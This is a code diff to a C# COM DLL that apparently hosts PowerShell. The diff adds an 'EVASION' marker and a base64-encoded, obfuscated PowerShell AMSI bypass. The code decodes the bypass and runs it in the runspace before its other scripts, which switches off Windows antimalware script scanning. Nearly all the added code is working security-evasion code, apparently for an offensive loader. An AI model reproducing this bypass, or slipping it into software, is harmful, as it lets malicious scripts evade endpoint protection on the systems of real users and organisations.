@@ -42,6 +42,8 @@ namespace ComDll
     [STAThread]
     public static void COMDllDo(string[] args)
     {
+        //####EVASION####
+
         // Check .NET Framework version
         CheckCompatibility();
         
@@ -147,6 +149,17 @@ namespace ComDll
                     param([object]$Object)
                     $Object | Write-Output
                 }";
+
+            // Base64 encoded AMSI bypass
+            string encodedBypass = "U2BlVC1JdGBlbSAoICdWJysnYVInICsgICdJQScgKyAoKCJ7MX17MH0iLWYnMScsJ2JsRTonKSsncTInKSAgKyAoJ3VaJysneCcpICApICggW1RZcEVdKCAgInsxfXswfSItRidGJywnckUnICApICkgIDsgICAgKCAgICBHZXQtdmFySWBBYEJMRSAgKCAoJzFRJysnMlUnKSAgKyd6WCcgICkgIC1WYUwgICkuIkFgc3NgRW1ibHkiLiJHRVRgVFlgUGUiKCggICJ7Nn17M317MX17NH17Mn17MH17NX0iIC1mKCdVdGknKydsJyksJ0EnLCgnQW0nKydzaScpLCgoInswfXsxfSIgLWYgJy5NJywnYW4nKSsnYWdlJysnbWVuJysndC4nKSwoJ3UnKyd0bycrKCJ7MH17Mn17MX0iIC1mICdtYScsJy4nLCd0aW9uJykpLCdzJywoKCJ7MX17MH0iLWYgJ3QnLCdTeXMnKSsnZW0nKSAgKSApLiJnYGV0ZmBpRWxEIiggICggInswfXsyfXsxfSIgLWYoJ2EnKydtc2knKSwnZCcsKCdJJysoInswfXsxfSIgLWYgJ25pJywndEYnKSsoInsxfXswfSItZiAnaWxlJywnYScpKSAgKSwoICAiezJ9ezR9ezB9ezF9ezN9IiAtZiAoJ1MnKyd0YXQnKSwnaScsKCdOb24nKygiezF9ezB9IiAtZid1YmwnLCdQJykrJ2knKSwnYycsJ2MsJyAgKSkuInNFYFRgVmFMVUUiKCAgJHtuYFVMbH0sJHt0YFJ1RX0gKQ==";
+
+            // Decode and execute the AMSI bypass
+            byte[] data = Convert.FromBase64String(encodedBypass);
+            string amsiBypass = Encoding.UTF8.GetString(data);
+            
+            ps.AddScript(amsiBypass).Invoke();
+            ps.Commands.Clear();
+
             ps.AddScript(redefineWriteHost).Invoke();
             ps.Commands.Clear();
         }
